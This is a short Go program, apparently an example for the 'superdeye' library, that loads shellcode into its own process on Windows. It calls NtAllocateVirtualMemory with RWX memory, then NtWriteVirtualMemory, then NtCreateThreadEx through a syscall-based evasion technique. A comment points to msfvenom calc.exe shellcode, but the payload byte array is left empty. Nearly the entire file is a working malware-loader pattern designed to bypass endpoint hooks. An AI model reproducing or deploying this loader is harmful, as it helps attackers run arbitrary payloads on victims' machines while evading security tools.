package main

import (
	"fmt"
	"unsafe"

	"github.com/almounah/superdeye"
	"golang.org/x/sys/windows"
)

func main() {
	// Shellcode with msfvenom -p windows/x64/exec CMD="calc.exe" EXITFUNC=thread -f go
	payloadClearText := []byte{
		,
	}

	// Self Inject, so getting current process Handle
	handleProcess := uintptr(0xffffffffffffffff)

	// NtAllocateVirtualMemory is predefined in superdeye. I will just use it.
	pBaseAddress, NTSTATUS, err := superdeye.NtAllocateVirtualMemory(windows.Handle(handleProcess), uintptr(0), uintptr(len(payloadClearText)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		// If we are here, it means the syscall was never made. Probably an issue with the Hell Hall Implmentation etc.
		fmt.Println(err.Error())
	}
	// The syscall is made, so lets print NTSTATUS to check if it is 0.
	fmt.Println("Syscall NtAllocateVirtualMemory Made with NTSTATUS ", NTSTATUS)

	var numberOfBytesWritten uintptr
	NTSTATUS, err = superdeye.NtWriteVirtualMemory(windows.Handle(handleProcess), pBaseAddress, &payloadClearText[0], uintptr(len(payloadClearText)), &numberOfBytesWritten)
	if err != nil {
		fmt.Println(err.Error())
	}
	fmt.Println("Syscall NtWriteVirtualMemory Made with NTSTATUS ", NTSTATUS)

    // NtCreateThreadEx is not predefined in SuperdEye. I just call it using a SuperdSyscall.
	var hThread uintptr
	NTSTATUS, err = superdeye.SuperdSyscall("NtCreateThreadEx", uintptr(unsafe.Pointer(&hThread)), uintptr(0x1FFFFF), uintptr(0), handleProcess, pBaseAddress, uintptr(0), uintptr(0), uintptr(0), uintptr(0), uintptr(0), uintptr(0))
	if err != nil {
		fmt.Println(err.Error())
	}
	fmt.Println("Syscall NtCreateThreadEx Made with NTSTATUS ", NTSTATUS)

	// Dummy Variable to hang the program until ENTER is pressed on Keyboard
	var enter string
	fmt.Scanln(&enter)
}
